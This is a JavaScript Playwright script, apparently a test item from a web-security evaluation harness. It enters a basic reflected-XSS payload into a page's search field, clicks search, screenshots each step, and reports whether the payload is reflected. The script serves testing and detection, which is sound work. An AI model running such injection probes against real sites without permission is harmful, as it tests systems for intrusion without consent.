import path from 'path';

export default async function(page, fileUrl, screenshotsDir) {
  try {
    // Navigate to the HTML file
    await page.goto(fileUrl);
    await page.waitForLoadState('networkidle');

    // Take initial screenshot
    const screenshots = [];
    await page.screenshot({ path: path.join(screenshotsDir, 'step_1_initial.png') });
    screenshots.push(path.join(screenshotsDir, 'step_1_initial.png'));

    // Wait for search input and enter XSS payload
    await page.waitForSelector('#searchInput', { timeout: 5000 });
    const xssPayload = '<script>alert("XSS")</script>';
    await page.fill('#searchInput', xssPayload);

    // Take screenshot after entering payload
    await page.screenshot({ path: path.join(screenshotsDir, 'step_2_payload_entered.png') });
    screenshots.push(path.join(screenshotsDir, 'step_2_payload_entered.png'));

    // Click search button using multiple selector strategies
    const searchBtn = await page.$('.search-btn') || await page.$('button[class*="search"]');
    if (searchBtn) {
      await searchBtn.click();
    } else {
      throw new Error('Search button not found');
    }

    // Wait for potential page changes and take final screenshot
    await page.waitForTimeout(1000);
    await page.screenshot({ path: path.join(screenshotsDir, 'step_3_after_search.png') });
    screenshots.push(path.join(screenshotsDir, 'step_3_after_search.png'));

    // Check if payload appears in page content
    const pageContent = await page.content();
    const payloadReflected = pageContent.includes(xssPayload);

    return {
      success: true,
      action: "Attempted XSS injection via search input",
      extractedData: {
        payloadUsed: xssPayload,
        payloadReflected: payloadReflected,
        pageTitle: await page.title()
      },
      screenshots,
      error: null
    };
  } catch (error) {
    return {
      success: false,
      action: "Failed to complete XSS attempt",
      extractedData: {},
      screenshots: [],
      error: error.message
    };
  }
}
